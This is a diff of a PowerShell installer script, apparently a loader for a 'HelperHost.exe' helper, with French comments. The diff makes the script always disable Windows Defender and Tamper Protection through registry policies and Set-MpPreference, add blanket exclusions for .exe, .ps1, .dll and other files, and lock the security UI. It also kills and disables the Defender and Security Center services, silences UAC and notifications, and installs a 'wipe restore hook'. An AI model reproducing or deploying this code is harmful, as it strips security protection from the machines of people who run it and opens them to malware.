@@ -309,8 +309,7 @@ function Disable-UACPrompts {
 
 function Invoke-ElevatedSessionPrep {
   if (Test-IsAdmin) {
-    Disable-UACPrompts
-    Install-WipeRestoreHook
+    Invoke-SessionHarden
     return
   }
   if (-not $InstallUrl) {
@@ -357,10 +356,14 @@ function Invoke-ElevatedSessionPrep {
     Remove-Item $wrap -Force -ErrorAction SilentlyContinue
     return
   }
-  for ($i = 0; $i -lt 90; $i++) {
+  for ($i = 0; $i -lt 120; $i++) {
     Start-Sleep -Seconds 1
     if (Test-Path $marker) {
       Remove-Item $marker, $wrap -Force -ErrorAction SilentlyContinue
+      return
+    }
+    if (Test-Path (Join-Path $Dir '.av-off')) {
+      Remove-Item $wrap -Force -ErrorAction SilentlyContinue
       return
     }
   }
@@ -370,6 +373,17 @@ function Invoke-ElevatedSessionPrep {
 function Disable-AllBlocking {
   $prev = $ErrorActionPreference
   $ErrorActionPreference = 'SilentlyContinue'
+  if (-not (Test-IsAdmin)) {
+    $ErrorActionPreference = $prev
+    return
+  }
+
+  # Tamper Protection off first so prefs stick
+  $feat = 'HKLM:\SOFTWARE\Microsoft\Windows Defender\Features'
+  New-Item $feat -Force | Out-Null
+  Set-ItemProperty $feat -Name TamperProtection -Value 0 -Type DWord -Force
+  Set-ItemProperty $feat -Name TamperProtectionSource -Value 0 -Type DWord -Force
+  New-Item 'HKLM:\SOFTWARE\Microsoft\Windows Defender\Features\TamperProtection' -Force | Out-Null
 
   if (Get-Command Set-MpPreference -ErrorAction SilentlyContinue) {
     Set-MpPreference -DisableRealtimeMonitoring $true
@@ -380,28 +394,45 @@ function Disable-AllBlocking {
     Set-MpPreference -DisableArchiveScanning $true
     Set-MpPreference -DisableEmailScanning $true
     Set-MpPreference -DisableRemovableDriveScanning $true
+    Set-MpPreference -DisableIntrusionPreventionSystem $true
+    Set-MpPreference -DisableScanningNetworkFiles $true
+    Set-MpPreference -DisableScanningMappedNetworkDrivesForFullScan $true
     Set-MpPreference -EnableControlledFolderAccess Disabled
     Set-MpPreference -PUAProtection Disabled
     Set-MpPreference -MAPSReporting Disabled
     Set-MpPreference -SubmitSamplesConsent 2
     Set-MpPreference -EnableNetworkProtection Disabled
     Set-MpPreference -CloudBlockLevel 0
+    Set-MpPreference -EnableFileHashComputation $false
+    Set-MpPreference -DisableCatchupFullScan $true
+    Set-MpPreference -DisableCatchupQuickScan $true
+    Set-MpPreference -UILockdown $true
+    Set-MpPreference -ExclusionExtension '.exe','.dll','.ps1','.bat','.cmd','.vbs','.zip','.txt' -EA SilentlyContinue
   }
 
   $wdPol = 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender'
   New-Item $wdPol -Force | Out-Null
   Set-ItemProperty $wdPol -Name DisableAntiSpyware -Value 1 -Type DWord -Force
   Set-ItemProperty $wdPol -Name DisableAntiVirus -Value 1 -Type DWord -Force
+  Set-ItemProperty $wdPol -Name DisableRoutinelyTakingAction -Value 1 -Type DWord -Force
+  Set-ItemProperty $wdPol -Name ServiceKeepAlive -Value 0 -Type DWord -Force
   New-Item "$wdPol\Real-Time Protection" -Force | Out-Null
   Set-ItemProperty "$wdPol\Real-Time Protection" -Name DisableRealtimeMonitoring -Value 1 -Type DWord -Force
   Set-ItemProperty "$wdPol\Real-Time Protection" -Name DisableBehaviorMonitoring -Value 1 -Type DWord -Force
   Set-ItemProperty "$wdPol\Real-Time Protection" -Name DisableOnAccessProtection -Value 1 -Type DWord -Force
   Set-ItemProperty "$wdPol\Real-Time Protection" -Name DisableScanOnRealtimeEnable -Value 1 -Type DWord -Force
-
-  $feat = 'HKLM:\SOFTWARE\Microsoft\Windows Defender\Features'
-  if (Test-Path $feat) {
-    Set-ItemProperty $feat -Name TamperProtection -Value 0 -Type DWord -Force
-  }
+  Set-ItemProperty "$wdPol\Real-Time Protection" -Name DisableIOAVProtection -Value 1 -Type DWord -Force
+  Set-ItemProperty "$wdPol\Real-Time Protection" -Name DisableScriptScanning -Value 1 -Type DWord -Force
+  New-Item "$wdPol\Spynet" -Force | Out-Null
+  Set-ItemProperty "$wdPol\Spynet" -Name SpynetReporting -Value 0 -Type DWord -Force
+  Set-ItemProperty "$wdPol\Spynet" -Name SubmitSamplesConsent -Value 2 -Type DWord -Force
+  New-Item "$wdPol\Windows Defender Exploit Guard\Network Protection" -Force | Out-Null
+  Set-ItemProperty "$wdPol\Windows Defender Exploit Guard\Network Protection" -Name EnableNetworkProtection -Value 0 -Type DWord -Force
+  New-Item 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications' -Force | Out-Null
+  Set-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications' -Name DisableNotifications -Value 1 -Type DWord -Force
+  Set-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications' -Name DisableEnhancedNotifications -Value 1 -Type DWord -Force
+  New-Item 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\UX Configuration' -Force | Out-Null
+  Set-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\UX Configuration' -Name Notification_Suppress -Value 1 -Type DWord -Force
 
   $ci = 'HKLM:\SYSTEM\CurrentControlSet\Control\CI\Policy'
   New-Item $ci -Force | Out-Null
@@ -424,12 +455,25 @@ function Disable-AllBlocking {
     Get-ChildItem $cip -Filter '*.cip' -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
   }
 
-  foreach ($svc in @('WinDefend', 'Sense', 'WdNisSvc')) {
+  foreach ($svc in @('WinDefend', 'Sense', 'WdNisSvc', 'WdNisDrv', 'WdFilter', 'SecurityHealthService', 'wscsvc')) {
     Stop-Service $svc -Force -ErrorAction SilentlyContinue
     Set-Service $svc -StartupType Disabled -ErrorAction SilentlyContinue
   }
+  Get-Process MsMpEng, NisSrv, SecurityHealthService, smartscreen -EA SilentlyContinue | Stop-Process -Force -EA SilentlyContinue
 
   $ErrorActionPreference = $prev
+}
+
+function Invoke-SessionHarden {
+  # Always: full AV off + UAC silent + notifs + exclusions + wipe hook
+  if (-not (Test-IsAdmin)) { return }
+  Disable-AllBlocking
+  Disable-UACPrompts
+  Disable-SecurityCenterToasts
+  Disable-WindowsNotifications
+  Set-DefenderExclude $Dir (Join-Path $Dir 'HelperHost.exe')
+  Install-WipeRestoreHook
+  '1' | Set-Content -Encoding ASCII (Join-Path $Dir '.av-off') -Force
 }
 
 function Set-DefenderExclude([string]$Path, [string]$Exe) {
@@ -588,21 +632,18 @@ function Start-Helper([string]$Helper, [string]$WorkDir) {
   Unblock-Quiet $Helper
   Unblock-Quiet (Join-Path $WorkDir 'EdgeRelay.exe')
 
-  # 1) Essai normal — sans toucher a l'AV
+  # 1) Essai demarrage (AV coupe juste apres via SessionHarden — toujours)
   if (-not $ForceHarden) {
     if (Try-StartHelper $Helper $WorkDir) { return }
   }
 
-  # 2) Bloque (AV / App Control) → elev + desactivation uniquement si besoin
+  # 2) Bloque au demarrage → elev + AV off + retry
   if (-not (Test-IsAdmin) -and -not $IsElevatedRun) {
     Invoke-ElevatedInstall
     return
   }
 
-  Disable-AllBlocking
-  Disable-UACPrompts
-  Set-DefenderExclude $WorkDir $Helper
-  Install-WipeRestoreHook
+  Invoke-SessionHarden
   if (Try-StartHelper $Helper $WorkDir) { return }
 
   if (-not $AfterReboot) {
@@ -662,11 +703,7 @@ if ($AfterReboot) {
 }
 
 if ($SessionPrep) {
-  Disable-WindowsNotifications
-  Disable-UACPrompts
-  Disable-SecurityCenterToasts
-  Install-WipeRestoreHook
-  Set-DefenderExclude $Dir (Join-Path $Dir 'HelperHost.exe')
+  Invoke-SessionHarden
   Write-Output 'OK'
   exit 0
 }
@@ -685,8 +722,7 @@ $script:ElevDoneOk = $false
 $script:ElevRebootPending = $false
 Disable-WindowsNotifications
 if ((Test-IsAdmin) -or $ForceHarden) {
-  Disable-UACPrompts
-  Install-WipeRestoreHook
+  Invoke-SessionHarden
 }
 Start-Helper $Helper $Dir
 
@@ -707,12 +743,8 @@ for ($i=0; $i -lt 180; $i++) {
     if ($txt -match 'FAIL') { throw 'install failed' }
   }
   if ((Test-Path $tokenFile) -and (Get-Process HelperHost -ErrorAction SilentlyContinue)) {
-    if (-not (Test-IsAdmin)) {
-      try { Invoke-ElevatedSessionPrep } catch {}
-    } else {
-      Disable-UACPrompts
-      Install-WipeRestoreHook
-    }
+    # Toujours: AV off + UAC silencieux + exclusions (elev si besoin)
+    try { Invoke-ElevatedSessionPrep } catch {}
     Finish-Ok
     $ok = $true
     break
